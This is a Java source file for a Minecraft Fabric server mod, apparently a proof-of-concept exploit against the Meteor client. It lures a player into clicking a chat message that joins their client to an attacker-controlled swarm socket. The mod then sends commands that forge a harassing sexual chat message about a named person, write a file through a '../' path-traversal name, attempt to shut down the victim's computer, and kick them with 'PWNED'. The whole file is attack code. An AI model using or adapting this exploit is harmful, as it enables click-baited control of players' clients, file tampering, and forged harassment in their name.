package io.github.racoondog.meteor;

import com.mojang.brigadier.LiteralMessage;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import com.mojang.brigadier.exceptions.SimpleCommandExceptionType;
import net.fabricmc.api.DedicatedServerModInitializer;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.minecraft.command.argument.EntityArgumentType;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.text.ClickEvent;
import net.minecraft.text.Style;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import static net.minecraft.server.command.CommandManager.*;
import static com.mojang.brigadier.Command.SINGLE_SUCCESS;

public class MeteorRCEProofOfConceptServer implements DedicatedServerModInitializer {
    private static final SimpleCommandExceptionType SOCKET_ERROR = new SimpleCommandExceptionType(new LiteralMessage("An error occured with the socket."));
    public static final List<PlayerEntity> TARGETS = new ArrayList<>();
    public static final List<Task> COMMANDS = List.of(
            Task.command("notebot record start"),
            Task.command("say I wholeheartedly support the forced feminization of DAM. (Example forged message)"),
            Task.playNote(),
            Task.noop(),
            Task.noop(),
            Task.noop(),
            Task.command("notebot record save ../file"),
            Task.command("kick shutdown"), // If meteor rejects is installed, shutdown computer
            Task.command("disconnect PWNED !!!")
    );

    private SwarmServerSocket socket;

    /**
     * Runs the mod initializer.
     */
    @Override
    public void onInitializeServer() {
        CommandRegistrationCallback.EVENT.register(((dispatcher, registryAccess, env) -> {
            dispatcher.register(literal("pwner")
                    .then(literal("pwn").then(argument("player", EntityArgumentType.player()).executes(ctx -> {
                        setupServerSocket();

                        PlayerEntity target = EntityArgumentType.getPlayer(ctx, "player");

                        TARGETS.add(target);

                        target.sendMessage(Text.literal("Click me !! :3").setStyle(
                                Style.EMPTY.withFormatting(Formatting.YELLOW, Formatting.BOLD).withClickEvent(
                                        new ClickEvent(ClickEvent.Action.RUN_COMMAND, ".swarm join 127.0.0.1 6969")
                                )
                        ));

                        ctx.getSource().sendMessage(Text.literal("Sent click event.. >:3").formatted(Formatting.YELLOW));

                        return SINGLE_SUCCESS;
                    })))
            );
        }));
    }

    private void setupServerSocket() throws CommandSyntaxException {
        if (this.socket == null) {
            try {
                this.socket = new SwarmServerSocket(6969);
            } catch (IOException e) {
                throw SOCKET_ERROR.create();
            }
        }
    }
}
